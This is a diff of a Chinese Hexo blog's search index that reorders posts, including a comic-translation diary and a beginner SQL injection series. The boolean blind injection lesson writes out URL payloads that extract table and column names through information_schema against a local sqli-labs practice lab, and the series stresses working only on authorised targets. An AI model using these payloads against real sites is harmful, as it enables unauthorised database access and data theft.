-<figure class="highlight yaml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">5000</span></span><br><span class="line">  <span class="attr">compress:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">header:</span> <span class="literal">true</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>当然，可以将port: 后的数值修改成0-65535之间的任意端口（前提是没有被占用）</p>
-<p>（对的，就是在水一篇博文）</p>
-
-]]></content>
+</div>]]></content>
       <categories>
-        <category>前端</category>
+        <category>生活</category>
       </categories>
       <tags>
-        <tag>hexo</tag>
+        <tag>杂七杂八</tag>
       </tags>
   </entry>
   <entry>
@@ -973,29 +996,6 @@
       </categories>
       <tags>
         <tag>shields</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>记录第一次参与美漫翻译</title>
-    <url>/posts/sp-translate/</url>
-    <content><![CDATA[<p>有点小兴奋。我终于也成了一名”烤肉man”。以前看美剧、美漫的时候片头字幕组给我的感觉就是：帅爆了。试想一下，你将自己喜欢看的剧翻译成中文，你的同好看的某一集就是你翻译的——SO DAMN COOL!<span id="more"></span></p>
-<div class="story post-story"><h2 id="关于我看美漫这件事"><a href="#关于我看美漫这件事" class="headerlink" title="关于我看美漫这件事"></a>关于我看美漫这件事</h2><p>虽然我的头像是炭治郎，但其实我平时看日漫真不多，我近几年看过的日漫简直屈指可数：《鬼灭之刃》、《咒术回战》，《国王排名》甚至只看了一点点。倒是看美漫看得还比较多<del>，只不过没多少能拿来当头像的</del>。能拿到台面上来说的有：<em>Rick and Morty</em>, <em>Gravity Falls</em>, <em>Love,Death&amp;Robots</em>。剩下的就不多说了<del>，如果有美漫同好也可以私我</del>。反正对我来说，看日漫是因为热血，看美漫是因为脑洞。可能喜欢看美漫是因为它能让我从固化的思维当中暂时抽离出来吧！</p>
-</div><div class="story post-story"><h2 id="烤肉的起因"><a href="#烤肉的起因" class="headerlink" title="烤肉的起因"></a>烤肉的起因</h2><p>向看国外片子少的小伙伴们解释下，一般称没有翻译的外语片为生肉，有中文字幕的则叫做熟肉，而翻译过程就叫做烤肉。这件事的起因是我的一个好兄弟找到了这部动漫中文字幕组的账号，看到了他们发布的招新信息，他就加入了。后来他告诉我翻译工作频率很低、随缘，而且翻译测试很简单，我就跟着冲了。（果然easy，毕竟招新要求是初三以上即可 XD）</p>
-</div><div class="story post-story"><h2 id="烤肉的经过"><a href="#烤肉的经过" class="headerlink" title="烤肉的经过"></a>烤肉的经过</h2><p>严格来说，我做的并不能算烤肉的工作。这部动漫联手育碧等公司发布了三款游戏：真理之杖、完整破碎、手机毁灭者（看过动漫或者玩过游戏的小伙伴想必已经知道我说的是哪部动漫了<img no-lazy="" class="inline" src="https://npm.elemecdn.com/sticker-heo/Sticker-100/%E8%A2%AB%E6%89%93.png" style="height:1.5em">），我翻译的是游戏演示视频，但我已经很满意了。</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/06/62c58258a4818.png" data-fancybox="default" data-caption="聊天记录"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/06/62c58258a4818.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/06/62c58258a4818.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="聊天记录"></a><span class="image-caption">聊天记录</span></div></div>
-<p>很多加群的新人都会问这样一个问题：“有ddl吗？”他们都会得到相同的有些意外的答案：“没有”。因为所有翻译全都是用爱发电、为爱发电。没有人会要求你完成多少翻译任务，没有人限定翻译时间；同样地，没有人会进群划水，也没有人领了任务迟迟不完成。另外，在烤肉的过程中，虽然有wiki可以参考，但是像这样一部梗满天飞的美漫仍旧是很难翻译的。有些梗可能十分冷门，因此翻译难度很大，但是没有谁会摆烂瞎翻。之前群里有一段关于某一缩写的含义的讨论，持续了好几天才得出结论。</p>
-</div><div class="story post-story"><h2 id="一些感受"><a href="#一些感受" class="headerlink" title="一些感受"></a>一些感受</h2><p>加入翻译组不仅让我结识了一群该动漫的同好，也让我的翻译能力有了大幅度的提升。毕竟在大学里我的英语全靠高中的功底强撑着，我是不太可能主动学习英语的。但是我的确喜欢翻译，这是一种将地道的外国表达转换成够味儿的中文表达的过程，是多元文化的碰撞。当然，毋宁说是这让我理解更多梗、让我有一种平日里少有的自豪感。</p>
-<p>其实这样的翻译工作跟博客创作倒是有些相似之处：一群同好聚集在一起做喜欢的事，充满热情和活力，一起讨论问题、解决问题、分享。当然，还有为爱发电。我认识的绝大多数博主创作博客的目的都不是为了盈利，毕竟做博客的盈利或许都很难比得上维护博客所耗费的时间、精力、财力。对了，对我来说这两个圈子还有一个共同点：那就是比我现在大学生活的圈子精彩得多。</p>
-<p>最后放一张我翻译的片段吧！</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/07/06/62c5883784a98.png" data-fancybox="default" data-caption="image-20220706210344922"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/07/06/62c5883784a98.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/07/06/62c5883784a98.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220706210344922"></a><span class="image-caption">image-20220706210344922</span></div></div>
-<p>这是我第一次烤肉，因此很多表达翻译成中文自己都感觉怪怪的，希望能继续进步吧！<del>还想参与下半年电影字幕的翻译呢嘿嘿</del></p>
-
-</div>]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
-      <tags>
-        <tag>杂七杂八</tag>
       </tags>
   </entry>
   <entry>
@@ -1242,143 +1242,6 @@
       </tags>
   </entry>
   <entry>
-    <title>SQL注入新手教程（三）——布尔盲注</title>
-    <url>/posts/sqli3/</url>
-    <content><![CDATA[<p>在<a href="../../posts/sqli2/">上一期教程</a>中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！</p>
-<div class="story post-story"><h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。</p>
-</div><div class="story post-story"><h2 id="判断数据库是否能被布尔盲注"><a href="#判断数据库是否能被布尔盲注" class="headerlink" title="判断数据库是否能被布尔盲注"></a>判断数据库是否能被布尔盲注</h2><p>依然，我们首先打开PHPstudy面板，启动WAMP。<br>在浏览器地址栏输入<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>进入Lesson8（按照你的端口号、目录名等修改）。<br>猜测对应的后端SQL语句为：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>此时页面显示如下：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" data-fancybox="default" data-caption="有提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bc0d87e23.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="有提示文字"></a><span class="image-caption">有提示文字</span></div></div>
-
-<p>接着我们尝试破坏查询，在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1'</span><br></pre></td></tr></tbody></table></figure>
-
-<p>猜测对应的后端SQL语句为：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现页面显示如下：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" data-fancybox="default" data-caption="无提示文字"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1bcef999c9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="无提示文字"></a><span class="image-caption">无提示文字</span></div></div>
-
-<p>观察上图我们可以发现，<code>You are in...</code>这段话不见了，说明这段查询语句是有问题的，即我们破坏查询成功了。但是页面没有回显报错信息，说明我们之前用的显注方法失效了。这时我们便要用到布尔盲注了。</p>
-<p>接着我们就继续判断我们传入的参数在后端是如何被封装的。<br>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost:81/sqli/Less-8/?id=1' and 1=1 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现那段文字<code>You are in...</code>（后文称提示文字）又重新出现了，这证明：(i)参数是由单引号封装的；(ii)后端对1=1进行了判断并返回TRUE，可以进行布尔盲注。<br>因此推翻之前的SQL语句猜测，此处后端SQL语句形如：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
-
-
-
-</div><div class="story post-story"><h2 id="布尔盲注思路"><a href="#布尔盲注思路" class="headerlink" title="布尔盲注思路"></a>布尔盲注思路</h2><p>确认能够进行布尔盲注后，我们需要想办法获取我们想要的数据。通常会编写脚本来自动进行布尔盲注，但本文重点在于厘清布尔盲注的原理和实现路线，因此采用手动注入的方法。</p>
-<p>首先，我们需要知道当前数据库有哪些表、各自的名称，并判断哪些表含有重要信息；接着，我们需要知道表里有哪些字段、各自的名称，并判断哪些字段含有重要信息；最后我们获取到相应字段对应的每一条记录。</p>
-<p>这个由大及小的思路与之前的盲注并无差别，唯一不同的是这次我们不会直接看到查询的结果，而需要通过逻辑表达式和关系表达式是否返回为TRUE来猜解我们想要得到的信息。在布尔盲注的过程中，由于表中数据的不确定性，如果我们想要通过枚举出查询结果所有可能的值，这个工作量是非常大的。因此，我的方法是先确定数据库中表的数量，再确定每一个表的名称。确定表名时，先得到查询结果的字符串长度区间，再确定字符串长度，先确定每一个字符的ASCII码区间，再确定每一个字符的确切ASCII码。如果你有点迷糊了，没有关系，请接着往下看。</p>
-</div><div class="story post-story"><h2 id="确定数据库中表的数量"><a href="#确定数据库中表的数量" class="headerlink" title="确定数据库中表的数量"></a>确定数据库中表的数量</h2><p>我采用的方法是：让后端判断第n个表的字符串长度是否大于0，如果提示文字出现，则证明数据库有第n个表，否则证明数据库中最多有n-1个表。</p>
-<p>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>后端SQL语句形如：</p>
-<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="string">'1'</span> <span class="keyword">and</span> (length((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">3</span>,<span class="number">1</span>))) <span class="operator">&gt;</span> <span class="number">0</span> <span class="comment">--+'</span></span><br></pre></td></tr></tbody></table></figure>
-
-<p>这段语句的意思为：从数据库的表名中查询id=’1’的所有字段并且当前数据库中的第4个表名字符串长度大于0。其中length()函数作用是取查询结果的字符串长度，用法为length(字符串)。如果你忘了这句语句中其他地方的含义，请见<a href="../sqli2/">上一章</a>。<br>结果，页面显示了提示文字。表明当前数据库至少有4张表。<br>接着我们将地址栏中的字符改为</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 4,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>作用是判断第5个表的字符串长度是否大于0，换言之，第5张表是否存在。<br>结果发现页面并没有显示提示文字。<br>由此，我们得到结论：当前数据库中有且仅有4张表。</p>
-</div><div class="story post-story"><h2 id="确定表名的字符串长度"><a href="#确定表名的字符串长度" class="headerlink" title="确定表名的字符串长度"></a>确定表名的字符串长度</h2><p>我们首先确定第一张表的字符串长度，用到的方法与上一小节类似。<br>在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) &gt; 5 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>作用是判断第一张表表名的字符串长度是否大于5。<br>结果页面显示提示文字，证明第一张表表名的字符串长度大于5。<br>接着我们将5改成6，发现页面不显示提示文字了。答案也就出来了，第一张表表名的字符串长度为6。用同样的方法我们也可以获取其他表名的字符串长度。</p>
-</div><div class="story post-story"><h2 id="确定表名的每一个字符所对应的ASCII码值"><a href="#确定表名的每一个字符所对应的ASCII码值" class="headerlink" title="确定表名的每一个字符所对应的ASCII码值"></a>确定表名的每一个字符所对应的ASCII码值</h2><p>在确定了每张表表名的字符串长度之后，我们就需要确定其每一个字符的具体值。但是表名有可能是字母、数字、标点符号、操作符、特殊字符等，倘若我们一个个尝试，效率会很低。因此我们会想到用ASCII码值来判断字符的具体值。每一个ASCII码对应一个字符，主要对应关系如下图：</p>
-<div galleryflag="" itemscope="" itemtype="http://schema.org/ImageGallery" class="gallery " data-group="default"><div class="fancybox"><a class="fancybox" pjax-fancybox="" itemscope="" itemtype="http://schema.org/ImageObject" itemprop="url" href="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" data-fancybox="default" data-caption="ASCII码对应表"><img fancybox="" itemprop="contentUrl" src="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" class="lazyload" data-srcset="https://oc.arcitcgn.cn/2022/06/21/62b1cf9b79cc0.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="ASCII码对应表"></a><span class="image-caption">ASCII码对应表</span></div></div>
-
-<p>我们这里以第四张表为例（问就是第四张表重要），在地址栏输入</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1))) &gt; 96 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>其中，substr()函数作用为截取字符串中指定位置开始的指定个字符，用法为：substr(字符串,起始位置,截取长度)，起始位置从1开始。ascii()函数作用为取字符的ASCII码值，用法为ascii(字符)。因此上述语句作用为判断第4张表表名的第一个字符ASCII码值是否大于96。<br>结果发现页面显示提示文字，证明第4张表表名的第一个字符ASCII码值大于96，因此很大概率它是一个小写的英文字母。可以将<code>&gt; 96</code>改为<code>&lt; 123</code>尝试一下，发现的确如此。</p>
-<p>接着可以采用二分法来确定该字符的具体值。将<code>&lt; 123</code>改为<code>&gt; 110</code>发现页面显示提示文字，因此将111和122作为两个端点继续划分。将<code>&gt; 110</code>改为<code>&lt; 117</code>发现页面不显示提示文字。因此可以确定该字符为u,v,w,x,y,z中的一个，继续二分法或者枚举都可以得到：该字符为u。</p>
-<p>利用同样的方法，我们猜解得到第四张表的表名为<strong>users</strong>。同样地，我们也能够猜解出其他表名。</p>
-</div><div class="story post-story"><h2 id="确定表中字段数"><a href="#确定表中字段数" class="headerlink" title="确定表中字段数"></a>确定表中字段数</h2><p>与确定数据库中表数量的方法一致，只需将<code>table_name</code>替换为<code>column_name</code>，<code>information_schema.tables</code>替换为<code>information_schema.columns</code>，<code>table_schema=database()</code>替换为<code>table_name='users'</code>即可。如：</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://localhost/sqli/Less-8/?id=1' and (length((select column_name from information_schema.columns where table_name='users' limit 3,1))) &gt; 0 --+</span><br></pre></td></tr></tbody></table></figure>
-
-<p>发现页面显示提示文字，证明users表中至少有4个字段。利用和上文一样的方法，最终可以知道users表中有6个字段。</p>
-</div><div class="story post-story"><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>确定字段的字符串长度，确定字段的每个字符具体值；确定记录数，确定记录的字符串长度，确定记录的每个字符具体值。方法与前文完全一致。有兴趣的小伙伴可以尝试一下继续手动猜解。</p>
-</div><div class="story post-story"><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>本文主要目的是为读者厘清布尔盲注的原理和思路，实际上，手动进行布尔盲注效率十分低下，几乎用不到。但如果时间充裕，可以感受一下手动进行布尔盲注的过程，私以为这有助于更清晰地认识布尔盲注。</p>
-
-</div>]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>SQL注入新手教程——前言</title>
-    <url>/posts/sqliIntro/</url>
-    <content><![CDATA[<div class="story post-story"><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>​	要了解什么是SQL注入，我们首先要知道SQL是什么。<strong>SQL，全称Structured Query Language</strong>，即数据库的结构化查询语句，用来从数据库中查询内容。<span id="more"></span><br>​	绝大多数网站都有一个<strong>数据库</strong>，比如我们在网购平台搜索商品的时候，其实就是在从网站的数据库中查询我们想要的内容，这个过程就用到了SQL语句，只不过是在设计好的语句中插入了我们输入的值。<br>​	但是如果一个web应用程序对用户输入的内容不进行严格的筛查和过滤，用户就有可能通过改变输入的值、添加SQL语句执行不被授权的操作，从而查看数据库的敏感信息或者在服务器上植入木马等。这个过程就被称为<strong>SQL注入</strong></p>
-</div><div class="story post-story"><h2 id="学习SQL注入需要什么基础？"><a href="#学习SQL注入需要什么基础？" class="headerlink" title="学习SQL注入需要什么基础？"></a>学习SQL注入需要什么基础？</h2><p>​	显然，要学会基本的SQL语句。目前大多数网站使用的都是开源<del>可以白嫖</del>的MySQL数据库，因此建议学MySQL。当然，不同的数据库有不同的特性，但是绝大部分SQL语句都是通用的，因此学好一个数据库，其他的基本上也就没问题了。学的时候有几个重点：掌握好“增删查改“；MySQL自带的information_schema数据库中tables, columns, schemata表要有一个大概的了解（之后学习SQL注入的时候经常要查询其中的内容）。存储引擎、事务、数据库设计之类的可以不用深入学甚至不学。<br>​	其他的一些基础比如cookie，比较零碎，可以学到的时候再进行学习。</p>
-</div><div class="story post-story"><h2 id="如何学习（实践）SQL注入？"><a href="#如何学习（实践）SQL注入？" class="headerlink" title="如何学习（实践）SQL注入？"></a>如何学习（实践）SQL注入？</h2><p>​	SQL注入是一项技术，是技术就需要实践。但我们知道，利用SQL注入攻击他人的网站是违法行为，如果严重甚至构成犯罪。那么想要实践，就剩下两种方案：攻击用于学习SQL注入的网站；攻击自己搭建的测试网页。</p>
-<ul>
-<li>用于学习SQL注入的网站<ul>
-<li><a href="http://testphp.vulnweb.com/">vulnweb</a></li>
-<li><a href="https://portswigger.net/">PortSwigger</a></li>
-</ul>
-</li>
-<li>自己搭建靶场<ul>
-<li><a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> (本系列会介绍如何搭建)</li>
-<li><a href="https://github.com/digininja/DVWA">DVWA</a><br>这两个项目都在GitHub上开源，搭建教程可以去google或者CSDN搜索。</li>
-</ul>
-</li>
-</ul>
-<p><code>再次强调！！！千万不要在未授权的情况下尝试SQL注入！！！</code></p>
-</div><div class="story post-story"><h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><p>​	通过不同的分类方式，SQL注入被分为许多不同类型。但笔者认为如何分类并不十分重要，关键是要掌握每种SQL注入的原理。当然，还是要简单介绍一下SQL注入的分类。</p>
-<ul>
-<li><p>按照是否回显（在页面上显示查询的报错信息）可以分为：</p>
-<ul>
-<li><p>显注</p>
-</li>
-<li><p>盲注</p>
-</li>
-</ul>
-</li>
-<li><p>按照请求方式（服务器获取用户提供信息的方式）可以分为：</p>
-<ul>
-<li>GET型注入</li>
-<li>POST型注入</li>
-<li>Cookie型注入</li>
-<li>HTTP Header型注入</li>
-</ul>
-</li>
-<li><p>按照插入到查询语句中的参数类型可以分为：</p>
-<ul>
-<li>数值型注入（传入的参数为数值）</li>
-<li>字符型注入（传入的参数为字符串）<ul>
-<li>单引号字符型注入（字符串用单引号包裹：’输入的字符串’）</li>
-<li>双引号字符型注入（字符串用双引号包裹：”输入的字符串”）</li>
-<li>带括号的注入<ul>
-<li>数值+括号：(输入的数值)</li>
-<li>单引号字符串+括号：(‘输入的字符串’)</li>
-<li>双引号字符串+括号：(“输入的字符串”)</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>可以通过RSS订阅本篇博客,下一期将带大家搭建靶场环境🤓🤓🤓</p>
-
-</div>]]></content>
-      <categories>
-        <category>安全</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>Web安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>编辑器之神——vim基础教程</title>
     <url>/posts/vim/</url>
     <content><![CDATA[<div class="story post-story"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>vim编辑器，又被称为编辑器之神，倘若能够熟练使用，效率将极高。倘若使用Linux，使用vim几乎是必不可少的技能。<span id="more"></span></p>
@@ -1585,6 +1448,143 @@
       <tags>
         <tag>vim</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入新手教程——前言</title>
+    <url>/posts/sqliIntro/</url>
+    <content><![CDATA[<div class="story post-story"><h2 id="什么是SQL注入？"><a href="#什么是SQL注入？" class="headerlink" title="什么是SQL注入？"></a>什么是SQL注入？</h2><p>​	要了解什么是SQL注入，我们首先要知道SQL是什么。<strong>SQL，全称Structured Query Language</strong>，即数据库的结构化查询语句，用来从数据库中查询内容。<span id="more"></span><br>​	绝大多数网站都有一个<strong>数据库</strong>，比如我们在网购平台搜索商品的时候，其实就是在从网站的数据库中查询我们想要的内容，这个过程就用到了SQL语句，只不过是在设计好的语句中插入了我们输入的值。<br>​	但是如果一个web应用程序对用户输入的内容不进行严格的筛查和过滤，用户就有可能通过改变输入的值、添加SQL语句执行不被授权的操作，从而查看数据库的敏感信息或者在服务器上植入木马等。这个过程就被称为<strong>SQL注入</strong></p>
+</div><div class="story post-story"><h2 id="学习SQL注入需要什么基础？"><a href="#学习SQL注入需要什么基础？" class="headerlink" title="学习SQL注入需要什么基础？"></a>学习SQL注入需要什么基础？</h2><p>​	显然，要学会基本的SQL语句。目前大多数网站使用的都是开源<del>可以白嫖</del>的MySQL数据库，因此建议学MySQL。当然，不同的数据库有不同的特性，但是绝大部分SQL语句都是通用的，因此学好一个数据库，其他的基本上也就没问题了。学的时候有几个重点：掌握好“增删查改“；MySQL自带的information_schema数据库中tables, columns, schemata表要有一个大概的了解（之后学习SQL注入的时候经常要查询其中的内容）。存储引擎、事务、数据库设计之类的可以不用深入学甚至不学。<br>​	其他的一些基础比如cookie，比较零碎，可以学到的时候再进行学习。</p>
+</div><div class="story post-story"><h2 id="如何学习（实践）SQL注入？"><a href="#如何学习（实践）SQL注入？" class="headerlink" title="如何学习（实践）SQL注入？"></a>如何学习（实践）SQL注入？</h2><p>​	SQL注入是一项技术，是技术就需要实践。但我们知道，利用SQL注入攻击他人的网站是违法行为，如果严重甚至构成犯罪。那么想要实践，就剩下两种方案：攻击用于学习SQL注入的网站；攻击自己搭建的测试网页。</p>
+<ul>
+<li>用于学习SQL注入的网站<ul>
+<li><a href="http://testphp.vulnweb.com/">vulnweb</a></li>
+<li><a href="https://portswigger.net/">PortSwigger</a></li>
+</ul>
+</li>
+<li>自己搭建靶场<ul>
+<li><a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> (本系列会介绍如何搭建)</li>
+<li><a href="https://github.com/digininja/DVWA">DVWA</a><br>这两个项目都在GitHub上开源，搭建教程可以去google或者CSDN搜索。</li>
+</ul>
+</li>
+</ul>
+<p><code>再次强调！！！千万不要在未授权的情况下尝试SQL注入！！！</code></p>
+</div><div class="story post-story"><h2 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h2><p>​	通过不同的分类方式，SQL注入被分为许多不同类型。但笔者认为如何分类并不十分重要，关键是要掌握每种SQL注入的原理。当然，还是要简单介绍一下SQL注入的分类。</p>
+<ul>
+<li><p>按照是否回显（在页面上显示查询的报错信息）可以分为：</p>
+<ul>
+<li><p>显注</p>
+</li>
+<li><p>盲注</p>
+</li>
+</ul>
+</li>
+<li><p>按照请求方式（服务器获取用户提供信息的方式）可以分为：</p>
+<ul>
+<li>GET型注入</li>
+<li>POST型注入</li>
+<li>Cookie型注入</li>
+<li>HTTP Header型注入</li>
+</ul>
+</li>
+<li><p>按照插入到查询语句中的参数类型可以分为：</p>
+<ul>
+<li>数值型注入（传入的参数为数值）</li>
+<li>字符型注入（传入的参数为字符串）<ul>
+<li>单引号字符型注入（字符串用单引号包裹：’输入的字符串’）</li>
+<li>双引号字符型注入（字符串用双引号包裹：”输入的字符串”）</li>
+<li>带括号的注入<ul>
+<li>数值+括号：(输入的数值)</li>
+<li>单引号字符串+括号：(‘输入的字符串’)</li>
+<li>双引号字符串+括号：(“输入的字符串”)</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>可以通过RSS订阅本篇博客,下一期将带大家搭建靶场环境🤓🤓🤓</p>
+
+</div>]]></content>
+      <categories>
+        <category>安全</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL注入新手教程（三）——布尔盲注</title>
+    <url>/posts/sqli3/</url>
+    <content><![CDATA[<p>在<a href="../../posts/sqli2/">上一期教程</a>中我们学习了基于报错的注入，或者准确地说是GET型基于报错的注入。相信大家也看出来了，这种注入是非常简单的，意味着这种漏洞是非常低级的。我们所见到的大多数网站中都不会出现如此低级的SQL注入漏洞。更多时候页面是不会回显报错语句的，这时候事情就变复杂了。我们无法直接看到报错语句，就需要通过估计不同的查询结果是TRUE还是FALSE来判断某个数据库是否能够注入，这就是盲注！</p>
+<div class="story post-story"><h2 id="布尔盲注原理"><a href="#布尔盲注原理" class="headerlink" title="布尔盲注原理"></a>布尔盲注原理</h2><p>之所以叫盲注，是因为我们在注入的过程中不会看到后端的错误返回语句。此时，如果我们执行的语句返回值为1，页面的显示是一种模样，如果为0，那么页面的显示是另一种模样。利用这样的特性，我们可以在SQL语句中加入逻辑表达式、关系表达式，不断试错，从而理论上能够解得我们所需要的数据，这和猜解密码有点相似。</p>
+</div><div class="story post-story"><h2 id="判断数据库是否能被布尔盲注"><a href="#判断数据库是否能被布尔盲注" class="headerlink" title="判断数据库是否能被布尔盲注"></a>判断数据库是否能被布尔盲注</h2><p>依然，我们首先打开PHPstudy面板，启动WAMP。<br>在浏览器地址栏输入<a href="http://localhost/sqli/Less-8/?id=1">http://localhost/sqli/Less-8/?id=1</a>进入Lesson8（按照你的端口号、目录名等修改）。<br>猜测对应的后端SQL语句为：</p>
+<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p>此时页面显示如下：</p>
